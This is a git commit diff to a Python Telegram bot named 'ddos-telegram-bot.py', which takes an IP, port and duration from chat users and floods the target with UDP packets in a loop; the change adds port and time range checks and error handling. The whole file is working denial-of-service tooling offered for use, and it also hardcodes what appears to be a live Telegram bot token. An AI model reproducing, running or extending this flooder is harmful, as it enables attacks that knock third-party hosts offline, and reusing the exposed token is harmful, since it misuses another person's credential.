ad5de095fec7345d126647c9319fcfcb7cfb6844
IRFANSARI0 <irfansari999@gmail.com>
2024-05-14 05:46:15 +0000

    chagnes

--- ddos-telegram-bot.py
+++ ddos-telegram-bot.py
@@ -7,44 +7,55 @@ def start(update, context):
     update.message.reply_text("Hi! Greetings from Irfan")
     
 def help(update,context):
-    update.message.reply_text("FORMAT: {IP} {Port} {Time}")
+    update.message.reply_text("FORMAT: {IP} {Port} {Time} \ne.g.. 1.1.1.1 8080 120")
 
 def attack(update, context):
     arr = (update.message.text).split(' ')
     if len(arr) != 3:
-        update.message.reply_text("Wrong Format! Please Try Again...... \nFORMAT: {IP} {Port} {Time}")
-
+        update.message.reply_text("Wrong Format! Please Try Again...... \nFORMAT: {IP} {Port} {Time} \ne.g.. 1.1.1.1 8080 120")
         return
 
     host = arr[0]
     port = int(arr[1])
     second = int(arr[2])
+    print("Input: ", arr)
 
-    update.message.reply_text(
-        f"""
-        Attack Initiated
+    if port >= 30000 or port <= 10000:
+        update.message.reply_text("Enter the port between 10000 - 30000")
+        return
+    
+    if second < 0 or second > 1000:
+        update.message.reply_text("Enter the time between 0 - 1000")
+        return
 
-        IP: {host}
-        Port: {port}
-        Time: {second}
-        """
-    )
+    
+    try:
+        def send_packet(amplifier):
+            update.message.reply_text(
+                f"""
+                Attack Initiated
 
-    def send_packet(amplifier):
-        print(f"Attacking on IP: {host} Port: {port} for Time: {second}")
+                IP: {host}
+                Port: {port}
+                Time: {second}
+                """
+            )
+            print(f"Attacking on IP: {host} Port: {port} for Time: {second}")
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.connect((host, port))
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((host, port))
 
-        t_end = time.time() + second
-        while time.time() < t_end:
-            s.send(b"\x99" * amplifier)
+            t_end = time.time() + second
+            while time.time() < t_end:
+                s.send(b"\x99" * amplifier)
 
-    threading.Thread(target=send_packet(800), daemon=True).start()
-    update.message.reply_text("Attack Completed")
-    print("Attack Completed")
-
+        threading.Thread(target=send_packet(800), daemon=True).start()
+        update.message.reply_text("Attack Completed")
+        print("Attack Completed")
+        print("Bot is Ready to go:")
+    except:
+        update.message.reply_text("Wrong Format! Please Try Again...... \nFORMAT: {IP} {Port} {Time} \ne.g.. 1.1.1.1 8080 120")
 
 Token = "7147321137:AAEKH-6bkUqIUfE9K2E8eumfiQ18D-T4b_4"
 updater = telegram.ext.Updater(Token, use_context=True)
